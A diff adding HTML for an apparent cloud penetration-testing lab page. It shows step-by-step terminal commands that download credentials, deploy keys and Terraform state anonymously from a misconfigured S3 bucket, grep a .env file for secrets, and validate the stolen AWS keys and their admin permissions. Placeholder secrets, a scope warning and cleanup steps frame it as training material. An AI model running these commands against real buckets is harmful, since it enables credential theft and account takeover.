+              <div class="terminal-cmd">$ aws s3 cp s3://targetcorp-backup/credentials.csv ./loot/ --no-sign-request</div>
+              <div class="terminal-output">download: s3://targetcorp-backup/credentials.csv to ./loot/credentials.csv</div>
+              <div class="terminal-cmd">$ aws s3 cp s3://targetcorp-backup/deploy-keys.pem ./loot/ --no-sign-request</div>
+              <div class="terminal-output">download: s3://targetcorp-backup/deploy-keys.pem to ./loot/deploy-keys.pem</div>
+              <div class="terminal-cmd">$ aws s3 cp s3://targetcorp-backup/terraform/terraform.tfstate ./loot/ --no-sign-request</div>
+              <div class="terminal-output">download: s3://targetcorp-backup/terraform/terraform.tfstate to ./loot/terraform.tfstate</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Parse the downloaded <code>.env</code> file for credentials, API keys, and connection strings.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ cat ./loot/.env | grep -iE 'KEY|SECRET|PASSWORD|TOKEN|DATABASE'</div>
+              <div class="terminal-output">AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+DB_PASSWORD=Pr0d_p@ss!2024
+DB_HOST=prod-db.cluster-abc123.us-east-1.rds.amazonaws.com
+STRIPE_SECRET_KEY=sk_live_51ABC...xyz
+SENDGRID_API_KEY=SG.abc123...def456
+JWT_SECRET=super-secret-jwt-signing-key-2024
+SESSION_SECRET=a1b2c3d4e5f6g7h8i9j0</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 6 -->
+      <div class="lab-step">
+        <div class="step-num">6</div>
+        <div class="step-content">
+          <div class="step-desc">Validate the extracted AWS credentials by calling <code>sts:GetCallerIdentity</code> to confirm they are active.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE</div>
+              <div class="terminal-cmd">$ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY</div>
+              <div class="terminal-cmd">$ aws sts get-caller-identity</div>
+              <div class="terminal-output">{
+    "UserId": "AIDAJQABLZS4A3QDU576Q",
+    "Account": "123456789012",
+    "Arn": "arn:aws:iam::123456789012:user/dev-deploy"
+}</div>
+              <div class="terminal-cmd"># Check what permissions this identity has</div>
+              <div class="terminal-cmd">$ aws iam list-attached-user-policies --user-name dev-deploy</div>
+              <div class="terminal-output">{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "AdministratorAccess",
+            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+        }
+    ]
+}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">Check BPA</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">List Objects</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Filter Secrets</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Download</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Parse Credentials</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node highlight">Verify &amp; Pivot</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-triangle-exclamation"></i>
+      <strong>In a real engagement, document every credential found and report it immediately.</strong> Never use extracted credentials outside the authorized scope of the assessment. The <code>dev-deploy</code> user above has <code>AdministratorAccess</code> &mdash; this would be escalated as a critical finding.
+    </div>
+
+    <div class="lab-cleanup">
+      <i class="fa-solid fa-broom"></i>
+      <strong>Cleanup:</strong>
+      <ol>
+        <li>Unset exported environment variables: <code>unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY</code></li>
+        <li>Securely delete downloaded loot files: <code>rm -rf ./loot/</code></li>
+        <li>Report all extracted credentials to the client immediately &mdash; do not retain them beyond the assessment window</li>
+        <li>Restore your default AWS CLI profile if it was overwritten</li>
+      </ol>
+    </div>
+  </div>
+
+</div>
